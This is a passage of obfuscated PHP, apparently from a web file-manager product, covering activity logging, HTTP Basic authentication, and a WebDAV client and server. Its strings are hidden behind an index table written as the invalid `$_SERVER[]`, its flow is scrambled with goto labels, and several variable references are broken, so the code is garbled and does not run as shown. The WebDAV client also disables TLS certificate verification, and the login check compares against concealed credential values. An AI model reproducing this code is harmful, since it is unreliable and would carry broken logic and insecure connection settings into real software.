array($Bϼ[2095])); return $CѾڷ; } private function typeAll() { goto B; cՉ: foreach ($f֥ as $E => $Dų) { $Aэ[$Dų[0]] = $Aэ[$E]; } $Aэ[$Eߔ[2101]] = LNG($Eߔ[2482]); $Aэ[$Eߔ[2477]] = LNG($Eߔ[2483]); goto aω; B: $Eߔ =& $_SERVER[]; $Aэ = $this->typeList; $f֥ = array_filter($this->typeFile()); goto cՉ; aω: return $Aэ; goto cŪ; cŪ: } public function addLog($b, $Dҋ = array()) { goto fð; dը: parent::add($Dҋ); goto F҃ӵ; C: $b = get_client_ip(); if (!$Dҋ || strlen(json_encode($Dҋ)) >= 1024) { $Dҋ = array($e;[2484] => $b); } else { if (is_array($Dҋ)) { $Dҋ[$e;[2484]] = $b; } else { $Dҋ = array($e;[1049] => $Dҋ, $e;[2484] => $b); } } $Dҋ = array($e;[1443] => Session::sign(), $e;[1444] => $Dٱ, $e;[29] => $b, $e;[1446] => json_encode($Dҋ)); goto dը; fð: $e; =& $_SERVER[]; if (!isset($this->typeList[$b])) { return; } $Dٱ = USER_ID ? USER_ID : (isset($Dҋ[$e;[1453]]) ? $Dҋ[$e;[1453]] : 0); goto C; F҃ӵ: } public function remove($bӪ) { $this->where(array($_SERVER[][385] => $bӪ))->delete(); } private function _makeOrder($Fʶ = '') { goto Aꖏ; Aꖏ: $D =& $_SERVER[]; $c䍫 = $D[187]; $Aݵ = array($D[402] => $D[403], $D[404] => $D[405]); goto C; Dã: return $this->order($Fʶ); goto Eɋ; C: $A揰 = Input::get($D[408], $D[7], $D[2262], array($D[2198], $D[404])); $A揰 = $Aݵ[$A揰]; $Fʶ = $Fʶ . "{$c䍫}\x20{$A揰}"; goto Dã; Eɋ: } public function get($dŇ = '') { goto Bƃ; a: if ($dŇ[$EސΥ[1453]]) { $B[$EސΥ[1453]] = $dŇ[$EސΥ[1453]]; } if (isset($dŇ[$EސΥ[721]])) { $c̉ = $dŇ[$EސΥ[721]]; $f = isset($dŇ[$EސΥ[722]]) ? $dŇ[$EސΥ[722]] : time(); $B[$EސΥ[187]] = array($EސΥ[321], array($c̉, $f)); } if ($dŇ[$EސΥ[29]]) { $eٖ̭ = explode($EސΥ[47], $dŇ[$EސΥ[29]]); $Cƙ = $this->typeFile(); $E = array(); foreach ($eٖ̭ as $A茗) { $E[] = $A茗; if (isset($Cƙ[$A茗])) { $E = array_merge($E, $Cƙ[$A茗]); } } $E = array_unique($E); if ($E) { $B[$EސΥ[29]] = array($EސΥ[7], $E); } } goto fЉ; Eܑ: $Dä͞[$EސΥ[354]] = $this->logList($Dä͞[$EސΥ[354]]); return $Dä͞; goto Bĺ; Bƃ: $EސΥ =& $_SERVER[]; if (!$dŇ) { show_json(array()); } $B = array(); goto a; fЉ: if (!empty($dŇ[$EސΥ[2484]])) { $B[$EސΥ[405]] = array($EސΥ[771], "\45{$dŇ[$EސΥ[2484]]}\x25"); } $Dä͞ = $this->_makeOrder()->where($B)->selectPage(); if (empty($Dä͞[$EސΥ[354]])) { show_json(array(), !0, $Dä͞[$EސΥ[351]]); } goto Eܑ; Bĺ: } private function ipAddress(&$dꆦ) { $Dވ =& $_SERVER[]; if (!empty($dꆦ[$Dވ[2484]])) { $f➈Ц = IpLocation::get($dꆦ[$Dވ[2484]]); } else { $f➈Ц = LNG($Dވ[2485]); } $dꆦ[$Dވ[2486]] = $f➈Ц; } private function descZipDownload($b˗, &$C֐) { $Fޘɖ =& $_SERVER[]; if (!isset($b˗[$Fޘɖ[2487]])) { return; } $FМ = json_decode($b˗[$Fޘɖ[2487]], !0); foreach ($FМ as $fǖ) { if (!IO::init($fǖ[$Fޘɖ[75]])) { continue; } if (!($D = IO::infoFull($fǖ[$Fޘɖ[75]]))) { continue; } $b˗[$Fޘɖ[75]] = $fǖ[$Fޘɖ[75]]; $C֐[] = $b˗[$Fޘɖ[369]] = $D[$Fޘɖ[369]]; $C֐[] = $b˗[$Fޘɖ[2305]] = $D[$Fޘɖ[461]]; break; } return $b˗; } private function getSourceList(&$e떖) { $A軃 =& $_SERVER[]; $d = array(); foreach ($e떖 as $f珏 => $fȅנ) { goto Eװ돖; EƵ: $d[] = $Fʛ[$A軃[369]]; $d[] = $Fʛ[$A軃[2305]]; if ($Fʛ[$A軃[29]] == $A軃[492]) { $d[] = $Fʛ[$A軃[405]][$A軃[1022]]; $d[] = $Fʛ[$A軃[405]][$A軃[1023]]; } goto D; Eװ돖: $Fʛ = json_decode($fȅנ[$A軃[405]], !0); if ($fȅנ[$A軃[29]] == $A軃[2092]) { $Fʛ = $this->descZipDownload($Fʛ, $d); $e떖[$f珏][$A軃[405]] = json_encode($Fʛ); continue; } if (strpos($fȅנ[$A軃[29]], $A軃[2306]) !== 0) { goto bۋ; F: $d[] = $Fʛ[$A軃[369]] = $a䆋[$A軃[369]]; $d[] = $Fʛ[$A軃[2305]] = $a䆋[$A軃[461]]; $e떖[$f珏][$A軃[405]] = json_encode($Fʛ); goto d݃; bۋ: if (!isset($Fʛ[$A軃[75]]) || strpos($fȅנ[$A軃[29]], $A軃[2488]) !== 0) { continue; } if (!IO::init($Fʛ[$A軃[75]])) { continue; } if (!($a䆋 = IO::infoFull($Fʛ[$A軃[75]]))) { continue; } goto F; d݃: continue; goto BŮ; BŮ: } goto EƵ; D: if ($Fʛ[$A軃[29]] == $A軃[2313]) { $d[] = $Fʛ[$A軃[405]][$A軃[369]]; } goto aА; aА: } if (!$d) { return array(); } return Model($A軃[772])->sourceListInfo($d, !0); } private function logList($aʘ) { goto f; c: return $b卑; goto d; f: $aޝ =& $_SERVER[]; $e޽◉ = array_to_keyvalue($aʘ, $aޝ[33], $aޝ[1453]); $eَ蚅 = Model($aޝ[477])->userListInfo(array_unique($e޽◉)); goto eÊ; Dê: $A = array(); foreach ($aʘ as $EǙ => $aȭ) { goto Fȏ; Fȏ: $c瘟 = $aȭ[$aޝ[29]]; $eèԎ = isset($eَ蚅[$aȭ[$aޝ[1453]]]) ? $eَ蚅[$aȭ[$aޝ[1453]]] : !1; $C = strpos($c瘟, $aޝ[2489]) === 0 ? LNG($aޝ[2490]) : LNG($aޝ[2485]); goto Aˍ㱽; b樂ܣ: $aȭ[$aޝ[2261]] = $eèԎ; $d쐣΍ = json_decode($aȭ[$aޝ[405]], !0); $aȭ[$aޝ[2484]] = isset($d쐣΍[$aޝ[2484]]) ? $d쐣΍[$aޝ[2484]] : $aޝ[33]; goto cԲӑ; Aˍ㱽: $aȭ[$aޝ[28]] = isset($eèԎ[$aޝ[28]]) ? $eèԎ[$aޝ[28]] : LNG($aޝ[2485]); $aȭ[$aޝ[2353]] = isset($eèԎ[$aޝ[2353]]) ? $eèԎ[$aޝ[2353]] : $aޝ[33]; $aȭ[$aޝ[1359]] = isset($Dţ޿[$c瘟]) ? $Dţ޿[$c瘟] : $C; goto b樂ܣ; cԲӑ: $this->ipAddress($aȭ); if (strpos($c瘟, $aޝ[2306]) === 0 || isset($d쐣΍[$aޝ[2305]])) { goto cڳ; AѪӧ: if ($d쐣΍[$aޝ[2318]] && $d쐣΍[$aޝ[2318]][$aޝ[371]] == $aޝ[1095]) { $A[] = $aȭ[$aޝ[367]]; unset($aʘ[$EǙ]); continue; } goto b˖; B: if ($d쐣΍[$aޝ[29]] == $aޝ[2313]) { $d쐣΍[$aޝ[405]][$aޝ[369]] = $E[$d쐣΍[$aޝ[405]][$aޝ[369]]]; } if ($d쐣΍[$aޝ[29]] == $aޝ[2087]) { $d쐣΍[$aޝ[2318]] = $d쐣΍[$aޝ[391]]; $d쐣΍[$aޝ[2305]] = $d쐣΍[$aޝ[2318]][$aޝ[369]]; $d쐣΍[$aޝ[391]] = !1; $d쐣΍[$aޝ[369]] = $aޝ[33]; } if ($d쐣΍[$aޝ[391]] && $d쐣΍[$aޝ[391]][$aޝ[371]] == $aޝ[1095]) { $A[] = $aȭ[$aޝ[367]]; unset($aʘ[$EǙ]); continue; } goto AѪӧ; cڳ: $d쐣΍[$aޝ[391]] = $E[$d쐣΍[$aޝ[369]]]; $d쐣΍[$aޝ[2318]] = $E[$d쐣΍[$aޝ[2305]]]; if ($d쐣΍[$aޝ[29]] == $aޝ[492]) { $d쐣΍[$aޝ[405]][$aޝ[1022]] = $E[$d쐣΍[$aޝ[405]][$aޝ[1022]]]; $d쐣΍[$aޝ[405]][$aޝ[1023]] = $E[$d쐣΍[$aޝ[405]][$aޝ[1023]]]; } goto B; b˖: } $aȭ[$aޝ[405]] = $d쐣΍; goto f̓; f̓: unset($aȭ[$aޝ[2491]]); $b卑[] = $aȭ; goto D֒듃; D֒듃: } $this->clearSystemPathLog($A); goto c; eÊ: $E = $this->getSourceList($aʘ); $Dţ޿ = $this->typeAll(); $b卑 = array(); goto Dê; d: } private function clearSystemPathLog($A) { $f魄鋇 =& $_SERVER[]; if (count($A) == 0) { return; } $aǺס = array($f魄鋇[367] => array($f魄鋇[7], array_unique($A))); $this->where($aǺס)->delete(); } public function deviceList($d, $A୊ = 0) { $a =& $_SERVER[]; $Eߍ = array($a[1453] => $d, $a[187] => array($a[943], $A୊), $a[29] => $a[2060]); $EڿǾ = array(); $A۵ь = $this->field($a[2492])->where($Eߍ)->order($a[2316])->limit(50)->select(); foreach ($A۵ь as $Cӟ => $bɼ) { goto a; a: if ($Cӟ > 0 && abs($bɼ[$a[187]] - $A۵ь[$Cӟ - 1][$a[187]]) < 5) { continue; } $a = json_decode($bɼ[$a[405]], !0); $bɼ[$a[2484]] = isset($a[$a[2484]]) ? $a[$a[2484]] : $a[33]; goto C; C: unset($a[$a[2484]]); $aΏ = $this->deviceType($a[$a[2307]]); if (isset($EڿǾ[$aΏ])) { continue; } goto dב̂; dב̂: $this->ipAddress($bɼ); $bɼ[$a[405]] = $a; $EڿǾ[$aΏ] = $bɼ; goto A֟ɘ; A֟ɘ: } return array_values($EڿǾ); } public function deviceType($Cɫݫ) { return $Cɫݫ; } } goto DÞ; e؊: class HttpAuth { public static function get() { $a߶؈ =& $_SERVER[]; $a򄚏 = $a߶؈[33]; $b߉ = $a߶؈[33]; if (isset($_SERVER[$a߶؈[1776]])) { $a򄚏 = $_SERVER[$a߶؈[1776]]; $b߉ = $_SERVER[$a߶؈[1777]]; } elseif (isset($_SERVER[$a߶؈[1778]])) { $cꉽ = $_SERVER[$a߶؈[1778]]; if (strpos(strtolower($cꉽ), $a߶؈[1779]) === 0) { $cԪ = explode($a߶؈[4], base64_decode(substr($cꉽ, 6))); $a򄚏 = isset($cԪ[0]) ? $cԪ[0] : $a߶؈[33]; $b߉ = isset($cԪ[1]) ? $cԪ[1] : 0; } } return array($a߶؈[535] => $a򄚏, $a߶؈[912] => $b߉); } public static function error() { goto B; C: die; goto d; B: $Eڛӡ =& $_SERVER[]; header($Eڛӡ[1780]); header($Eڛӡ[1781]); goto Fˉڳ; Fˉڳ: header($Eڛӡ[1782]); header($Eڛӡ[1783]); header($Eڛӡ[1279]); goto C; d: } public static function make($e, $Eڰñ) { $C׼ݞ =& $_SERVER[]; return $C׼ݞ[1784] + base64_encode($e . $C׼ݞ[4] . $Eڰñ); } } class HttpDavClient { public function __construct($Eب, $B飇, $Eລ) { $this->header = array(); $this->userName = $B飇; $this->userPassowrd = $Eລ; } protected function makePath($E) { return $E; } protected function setHeader($bÏՒ, $F = false) { if ($F === !1) { $this->header[] = $bÏՒ; } else { $this->header[] = $bÏՒ . $_SERVER[][895] . $F; } } public function move($B, $f, $b뼔 = '') { $bԷ =& $_SERVER[]; $this->setHeader($bԷ[1785], $this->makePath($f)); $this->setHeader($bԷ[1786], $bԷ[1787]); if ($b뼔) { $this->setHeader($bԷ[1788], $bԷ[940] . $b뼔 . $bԷ[943]); } return $this->send($bԷ[1789], $B); } public function copy($a옺ֽ, $A񈱵) { $b =& $_SERVER[]; $this->setHeader($b[1785], $this->makePath($A񈱵)); $this->setHeader($b[1786], $b[1787]); return $this->send($b[1790], $a옺ֽ); } public function mkcol($F) { $Eޟ =& $_SERVER[]; $this->setHeader($Eޟ[1786], $Eޟ[1787]); return $this->send($Eޟ[1791], $F); } public function delete($D, $d̂ = '') { $a¤ =& $_SERVER[]; if ($d̂) { $this->setHeader($a¤[1788], $a¤[940] . $d̂ . $a¤[943]); } return $this->send($a¤[1267], $D); } public function propfind($E) { $fܖ =& $_SERVER[]; $this->setHeader($fܖ[1792], $fܖ[83]); $this->setHeader($fܖ[1793], $fܖ[1794]); $d = $fܖ[1795]; return $this->send($fܖ[1796], $E, $d); } public function options($f䇒) { return $this->send($_SERVER[][1797], $f䇒); } public function get($CȤЃ) { return $this->send($_SERVER[][216], $CȤЃ); } public function put($E݉, $BȊǐ, $A虬۔ = '') { $b儙ݻ =& $_SERVER[]; if ($A虬۔) { $this->setHeader($b儙ݻ[1788], $b儙ݻ[940] . $A虬۔ . $b儙ݻ[943]); } return $this->send($b儙ݻ[214], $E݉, $BȊǐ); } protected function send($D, $AѲ, $D = false, $A = false) { goto e; B: curl_setopt($C˖, CURLOPT_HTTPHEADER, $this->header); curl_setopt($C˖, CURLOPT_RETURNTRANSFER, !0); curl_setopt($C˖, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto E몜; Bސ: $this->setHeader($B); if ($D) { $D = $E[1799] . $D; } if (!request_url_safe($AѲ)) { return !1; } goto Eۤ; d: $this->header = array(); return $C͙͋; goto b; Eۤ: $C˖ = curl_init($AѲ); curl_setopt($C˖, CURLOPT_CUSTOMREQUEST, $D); curl_setopt($C˖, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto B; e: $E =& $_SERVER[]; $B = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($E[1798], $E[50]); goto Bސ; E몜: curl_setopt($C˖, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($C˖, CURLOPT_SSL_VERIFYHOST, !1); $C͙͋ = curl_exec($C˖); goto d; b: } } class HttpDavServer { public function __construct($DƑ, $A˱) { $this->root = $DƑ; $this->initPath($A˱); $this->start(); } public function initPath($f񚬬) { $BͦҬ =& $_SERVER[]; $aՠҿ = rtrim($_SERVER[$BͦҬ[1404]], $BͦҬ[8]) . $BͦҬ[8]; $this->urlBase = substr($aՠҿ, 0, strpos($aՠҿ, $f񚬬) + 1); $this->urlBase = rtrim($this->urlBase, $BͦҬ[8]) . $f񚬬; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $Cꪟ =& $_SERVER[]; $aĄ = HttpAuth::get(); if ($aĄ[$Cꪟ[535]] == $Cꪟ[1800] && $aĄ[$Cꪟ[912]] == $Cꪟ[1801]) { return !0; } HttpAuth::error(); } public function start() { goto c; Bކ: if (!method_exists($this, $Fé)) { pr($Fé . $B[1802]); die; } $Cȑ = array($B[1803], $B[1804]); if (!in_array($Fé, $Cȑ) && !$this->pathExists($this->path)) { $F = array($B[1047] => 404); } else { $F = $this->{$Fé}(); } goto Dӗ; c: $B =& $_SERVER[]; $this->checkUser(); $Fé = $B[144] . HttpHeader::method(); goto Bކ; Dӗ: if (!$F) { return; } self::response($F); goto D鏿; D鏿: } public function pathGet($a餖۟ = false) { $b¯ =& $_SERVER[]; $f㋉ = $a餖۟ ? $_SERVER[$b¯[1805]] : $_SERVER[$b¯[1404]]; $f㋉ = KodIO::clear(rawurldecode($f㋉)); if (!strstr($f㋉, KodIO::clear($this->urlBase))) { return !1; } return substr($f㋉, strpos($f㋉, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($C鴬) { return file_exists($C鴬); } public function pathMkdir($f) { return mkdir($f, 511, !0); } public function pathInfo($e) { return path_info($e); } public function pathList($cꓐ) { return path_list($cꓐ); } public function pathOut($Eĸ) { echo file_get_contents($Eĸ); } public function pathPut($eԞ׫, $b뙸ч = '') { if (!$b뙸ч) { return file_put_contents($eԞ׫, $_SERVER[][33]); } return move_path($b뙸ч, $eԞ׫); } public function pathRemove($e) { if (is_file($e)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($FٔƕՔ, $bɛ) { return move_path($FٔƕՔ, $bɛ); } public function pathCopy($EƘ, $FŠ) { return copy_dir($EƘ, $FŠ); } public function parsePath($e̷) { return $e̷; } public function parseItem($cۑ, $c) { goto B; B: $b =& $_SERVER[]; $D = $this->pathGet() . $b[8] . $cۑ[$b[28]]; $D = $b[8] . str_replace($b[172], $b[8], rawurlencode($D)); goto A㈥; C¤Ђ: $A = array($b[1806] => KodIO::clear($this->urlBase . $D), $b[107] => @gmdate($b[1807], $cۑ[$b[107]]), $b[187] => @gmdate($b[1808], $cۑ[$b[187]]), $b[77] => $cۑ[$b[77]] ? $cۑ[$b[77]] : 0); return $A; goto eԇ; A㈥: if ($c) { $D = $b[8] . str_replace($b[172], $b[8], rawurlencode($this->pathGet())); } if (!trim($cۑ[$b[107]])) { $cۑ[$b[107]] = time(); } if (!trim($cۑ[$b[187]])) { $cۑ[$b[187]] = time(); } goto C¤Ђ; eԇ: } public function parseItemXml($CЫό, $E) { $Dϳ =& $_SERVER[]; $bΦ = $this->parseItem($CЫό, $E); if ($CЫό[$Dϳ[29]] == $Dϳ[76]) { $B = $Dϳ[1809]; $B .= $Dϳ[1810]; } else { $bܓ = $CЫό[$Dϳ[160]] ? $CЫό[$Dϳ[160]] : get_path_ext($CЫό[$Dϳ[28]]); $aؾ = get_file_mime($bܓ); $B = $Dϳ[1811]; $B .= "\74\104\72\x67\145\164\x63\157\x6e\x74\x65\x6e\x74\x74\x79\160\145\76{$aؾ}\74\x2f\x44\72\x67\145\164\x63\x6f\156\164\x65\156\164\x74\x79\x70\145\x3e"; } return "\xa\x9\11\74\104\x3a\x72\x65\163\160\x6f\156\x73\x65\76\12\x9\11\11\74\x44\72\x68\162\145\146\76{$bΦ[$Dϳ[1806]]}\74\x2f\x44\x3a\150\x72\145\146\76\xa\11\11\x9\74\104\x3a\x70\x72\x6f\x70\x73\164\x61\x74\x3e\12\11\11\x9\11\74\x44\72\x70\162\157\160\76\xa\11\11\11\11\11\74\104\72\147\x65\x74\154\x61\163\164\x6d\x6f\144\151\146\151\145\x64\76{$bΦ[$Dϳ[107]]}\74\x2f\x44\72\x67\x65\164\x6c\141\x73\164\155\x6f\x64\x69\x66\151\x65\144\76\12\11\11\x9\x9\11\x3c\x44\72\143\162\145\141\x74\x69\157\156\x64\x61\x74\x65\x3e{$bΦ[$Dϳ[187]]}\x3c\x2f\x44\72\x63\162\x65\141\164\x69\157\x6e\144\141\164\x65\76\12\11\11\11\11\11\74\104\72\x67\145\x74\x63\157\x6e\x74\145\156\164\154\145\x6e\147\164\150\x3e{$bΦ[$Dϳ[77]]}\x3c\57\104\72\x67\145\164\143\157\156\x74\145\x6e\164\x6c\145\156\147\164\150\x3e\xa\x9\11\x9\x9\11{$B}\12\x9\11\11\11\x3c\x2f\104\72\x70\x72\157\160\x3e\xa\x9\11\11\x9\74\104\x3a\163\164\x61\x74\x75\163\x3e\110\124\x54\x50\x2f\61\56\61\40\x32\60\60\x20\x4f\x4b\x3c\57\x44\x3a\163\164\141\164\165\x73\x3e\12\11\x9\x9\x3c\57\104\x3a\160\162\157\160\163\x74\x61\164\x3e\12\11\x9\x3c\57\104\72\x72\x65\x73\160\x6f\156\x73\x65\x3e"; } public function pathListMerge($Aķڴ) { goto Fǆ; Fǆ: $bҩ =& $_SERVER[]; if (!$Aķڴ) { return $Aķڴ; } $bǈɛ = array($bҩ[73], $bҩ[74], $bҩ[1812]); goto D; cҌ: return $f; goto F; D: $f = array(); foreach ($Aķڴ as $AϿ => $D) { if (!in_array($AϿ, $bǈɛ) || !is_array($D)) { continue; } $f = array_merge($f, $D); } foreach ($f as &$eȩ) { $eȩ[$bҩ[28]] = str_replace($bҩ[8], $bҩ[1406], $eȩ[$bҩ[28]]); } goto cҌ; F: } public function httpPROPFIND() { goto e; e: $aۓ =& $_SERVER[]; $F־ = $this->pathList($this->path); $b񄓋 = $this->pathListMerge($F־); goto FѺ; bʺ: return array($aۓ[1815] => 207, $aۓ[1816] => "\74\x44\x3a\x6d\x75\154\164\x69\163\164\141\x74\x75\163\x20\x78\x6d\x6c\156\163\72\x44\75\42\104\x41\x56\72\x22\76\xa{$B̂ݩ}\xa\x3c\x2f\x44\72\155\165\x6c\x74\151\x73\x74\x61\164\x75\163\x3e"); goto B; aς: if ($c֭) { $b񄓋 = array($F); } else { $F[$aۓ[28]] = $aۓ[33]; $b񄓋 = array_merge(array($F), $b񄓋); } $B̂ݩ = $aۓ[33]; foreach ($b񄓋 as $Eĺԫ) { $B̂ݩ .= $this->parseItemXml($Eĺԫ, $c֭); } goto bʺ; FѺ: $F = $F־[$aۓ[1813]]; if (!is_array($b񄓋) || $F[$aۓ[1814]] === !1) { return array($aۓ[1815] => 404, $aۓ[1816] => $aۓ[1817]); } $c֭ = $F[$aۓ[29]] == $aۓ[167] || HttpHeader::get($aۓ[1792]) == $aۓ[468]; goto aς; B: } public function httpHEAD() { $Cĺ =& $_SERVER[]; $Cӈ簅 = $this->pathInfo($this->path); if (!$Cӈ簅 || $Cӈ簅[$Cĺ[29]] == $Cĺ[76]) { return array($Cĺ[1047] => 200, $Cĺ[1223] => array($Cĺ[1818])); } return array($Cĺ[1047] => 200, $Cĺ[1223] => array($Cĺ[1819], $Cĺ[136], $Cĺ[1820] . $Cӈ簅[$Cĺ[77]], $Cĺ[1821] . get_file_mime($Cӈ簅[$Cĺ[160]]), $Cĺ[132] . gmdate($Cĺ[1807], $Cӈ簅[$Cĺ[1270]]) . $Cĺ[1822], $Cĺ[1823])); } public function httpOPTIONS() { $Cѿ =& $_SERVER[]; return array($Cѿ[1047] => 200, $Cѿ[1223] => array($Cѿ[1824], $Cѿ[1825], $Cѿ[1826], $Cѿ[1279])); } public function httpPROPPATCH() { $fᢕ =& $_SERVER[]; $B۲ = $fᢕ[1827] . $_SERVER[$fᢕ[1404]] . $fᢕ[1828]; return array($fᢕ[1815] => 207, $fᢕ[1816] => "\x3c\104\72\155\165\x6c\164\151\163\x74\141\164\x75\x73\40\x78\x6d\154\156\163\x3a\104\75\x22\104\101\126\x3a\x22\76\xa{$B۲}\12\x3c\x2f\104\x3a\x6d\165\x6c\164\151\163\164\141\x74\165\x73\x3e"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $d =& $_SERVER[]; $CӲ裫 = $this->uploadFile(); if ($CӲ裫) { $eӬ = 204; } else { $CӲ裫 = $d[33]; $eӬ = 201; } $bۅ = $this->pathPut($this->path, $CӲ裫); if ($bۅ == !1) { $eӬ = 404; } return array($d[1815] => $eӬ); } private function uploadFile() { goto aӄҰ; aӄҰ: $Aӕ =& $_SERVER[]; @mk_dir(TEMP_FILES); $e = TEMP_FILES . $Aӕ[1829] . rand_string(32); goto B팉; bΩ: while (!feof($dڞ)) { fwrite($E˻, fread($dڞ, 1024 * 200)); } fclose($dڞ); fclose($E˻); goto e; e: if (@filesize($e) > 0) { return $e; } @unlink($e); return !1; goto D׾Ͳ; B팉: $E˻ = @fopen($e, $Aӕ[1538]); $dڞ = @fopen($Aӕ[1830], $Aӕ[1537]); if (!$dڞ || !$E˻) { @unlink($e); return !1; } goto bΩ; D׾Ͳ: } public function httpMKCOL() { $E޼ =& $_SERVER[]; if ($this->pathExists($this->path)) { return array($E޼[1047] => 409); } $C = $this->pathMkdir($this->path); return array($E޼[1047] => $C ? 201 : 403); } public function httpMOVE() { $eꒅ =& $_SERVER[]; $f鰓 = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$eꒅ[1831]])) { $e׋[$eꒅ[1832]] = $_SERVER[$eꒅ[1831]] == $eꒅ[1833]; } $bҷ = $this->pathMove($this->path, $f鰓); return array($eꒅ[1047] => $bҷ ? 201 : 404); } public function httpCOPY() { $F = $this->parsePath($this->pathGet(!0)); $aϫ = $this->pathCopy($this->path, $F); return array($_SERVER[][1047] => $aϫ ? 201 : 404); } public function httpDELETE() { $fŪ = $this->pathRemove($this->path); return array($_SERVER[][1047] => $fŪ ? 200 : 503); } public function httpLOCK() { $B =& $_SERVER[]; $B = md5($this->path); $a = $B[1834] . $this->xmlGet($B[1835]) . $B[1836] . $B . $B[1837]; return array($B[1047] => 200, $B[1223] => array($B[1838] . $B, $B[1839]), $B[1840] => $a); } public function httpUNLOCK() { return array($_SERVER[][1047] => 204); } public function xmlGet($bŋ) { goto c; d̃: return $Fι[33]; goto a屟; E˧砩: $f곐 = array_shift(explode($Fι[8], $bŋ)); $bᷤ = $B˽->getElementsByTagNameNS($Fι[1842], $f곐); if ($bᷤ) { return $bᷤ[0]->nodeValue; } goto d̃; c: $Fι =& $_SERVER[]; static $B˽ = false; if (!$B˽) { $Fۈ = file_get_contents($Fι[1841]); $B˽ = new DOMDocument(); $B˽->loadXML($Fۈ); } goto E˧砩; a屟: } public static function response($bÚ) { goto Aé; Aé: $fͨ =& $_SERVER[]; $C˿ = is_array($bÚ[$fͨ[1223]]) ? $bÚ[$fͨ[1223]] : array(); $C˿[] = HttpHeader::code($bÚ[$fͨ[1047]]); goto F; F: $C˿[] = $fͨ[1782]; $C˿[] = $fͨ[1783]; foreach ($C˿ as $A܎) { header($A܎); } goto B؜; B؜: if (is_string($bÚ[$fͨ[1840]])) { header($fͨ[1843]); $fɖኣ = $fͨ[1844] . $fͨ[217] . $bÚ[$fͨ[1840]]; echo $fɖኣ; } goto b; b: } } goto EǬۡ; a߉: class PathDriverDbShareItem extends PathDriverDB { public function __construct($Dڼ) { $this->pathParse = $Dڼ; $this->model = Model($_SERVER[][1133]); } public function getPathOuter($eǇь) { $f햎 =& $_SERVER[]; if (!$eǇь) { return $eǇь; } $B̘ = $this->parse($eǇь); return trim(KodIO::makeShare($this->pathParse[$f햎[367]], $B̘[$f햎[367]]), $f햎[8]); } protected function infoParse($e׬, $f = false, $C򘣈 = false) { $a٣Ľ =& $_SERVER[]; $d̢ = $this->pathParse[$a٣Ľ[367]]; $dں = trim($this->pathParse[$a٣Ľ[1027]], $a٣Ľ[8]); return Action($a٣Ľ[1140])->sharePathInfo($d̢, $dں); } public function infoFull($b֕) { $d׼ =& $_SERVER[]; $AԎ = explode($d׼[8], trim($b֕, $d׼[8])); if (count($AԎ) > 1) { $bȞ = implode($d׼[8], array_splice($AԎ, 1)); $B򆌨Ｓ = $this->model->pathInfoByPath($AԎ[0], $bȞ); if (!$B򆌨Ｓ) { return !1; } $this->pathParse[$d׼[1027]] = $B򆌨Ｓ[$d׼[369]]; } return $this->infoParse($b֕); } public function listAll($AѢ) { goto C棲; C棲: $b߾ =& $_SERVER[]; $eș = IO::info($this->pathParse[$b߾[75]]); if (!$eș) { return array(); } goto a; B: foreach ($Dċ as &$F蘾) { check_abort(); $F蘾[$b߾[391]] = $eͼꎊ->_shareItemeParse($F蘾[$b߾[391]], $b); } return $Dċ; goto DȒ龤; a: $Dċ = $this->model->listAll($AѢ); $b = Model($b߾[536])->getInfo($eș[$b߾[441]]); $eͼꎊ = Action($b߾[1140]); goto B; DȒ龤: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($b) { $this->pathParse = $b; $this->model = Model($_SERVER[][1133]); } protected function infoParse($dҴ, $fъǒ = false, $c݉ = false) { $Dه =& $_SERVER[]; return Action($Dه[1033])->sharePathInfo($this->pathParse[$Dه[75]], !0); } public function listPath($BÉɍ, $b = false) { $cѝ =& $_SERVER[]; $f˻ᖉ = parent::listPath($BÉɍ, $b); foreach ($f˻ᖉ as $c => $Fć) { if (!in_array($c, array($cѝ[73], $cѝ[74]))) { continue; } foreach ($Fć as $bѳڐ => $d蛇) { $f˻ᖉ[$c][$bѳڐ] = Action($cѝ[1033])->shareItemInfo($d蛇); } } return $f˻ᖉ; } public function listAll($Bݮ) { $B =& $_SERVER[]; $eړ = IO::info($this->pathParse[$B[75]]); if (!$eړ) { return array(); } $DӒȃ = $this->model->listAll($Bݮ); foreach ($DӒȃ as &$fŜ) { $fŜ[$B[391]] = Action($B[1033])->shareItemInfo($fŜ[$B[391]]); } return $DӒȃ; } } class PathDriverDriverShareItem { public function __construct($CȰٍ) { $this->pathParse = $CȰٍ; } public function __call($Eȼ, $f¶) { $e╆ =& $_SERVER[]; if (method_exists($this, $Eȼ)) { return; } $D = call_user_func_array(array($e╆[1141], $Eȼ), $f¶); $B׍у = array($e╆[1142], $e╆[1143], $e╆[1144], $e╆[1145], $e╆[490], $e╆[492], $e╆[1146], $e╆[103], $e╆[1147], $e╆[1148]); if (in_array($Eȼ, $B׍у)) { $D = $this->getPathOuter($D); } return $D; } public function copy($AƉ®, $a񋜪, $dꨞ = false) { return $this->copyMove($AƉ®, $a񋜪, $dꨞ, $_SERVER[][490]); } public function move($AƏ, $e󙐆, $C֝ = false) { return $this->copyMove($AƏ, $e󙐆, $C֝, $_SERVER[][492]); } private function copyMove($DМ, $Cۏ, $C̹, $bᬿ) { goto b; D: return $Aя; goto F; B: if ($aÄթ->pathParse[$Cզ[1013]]) { $Cۏ = $aÄթ->pathParse[$Cզ[1013]]; } else { $Cۏ = $fߗ՟; } $Aя = IO::copyMove($DМ, $Cۏ, $C̹, $bᬿ); $Aя = $this->getPathOuter($Aя); goto D; b: $Cզ =& $_SERVER[]; $fߗ՟ = $Cۏ; $aÄթ = IO::driverMake($Cۏ); goto B; F: } public function pathFather($D۽) { return get_path_father($this->pathParse[$_SERVER[][75]]); } public function iconvSystem($a袎) { return $a袎; } protected function infoParse($fۢ, $A߱ = false) { $a =& $_SERVER[]; $fϚݑ = $this->pathParse[$a[439]][$a[1034]] . $this->pathParse[$a[1027]]; if ($A߱) { $C = IO::infoWithChildren($fϚݑ); } else { $C = IO::info($fϚݑ); } $Fꃮ = $this->pathParse[$a[439]]; return Action($a[1140])->_shareItemeParse($C, $Fꃮ); } public function listAll($f) { $B =& $_SERVER[]; $Fт = 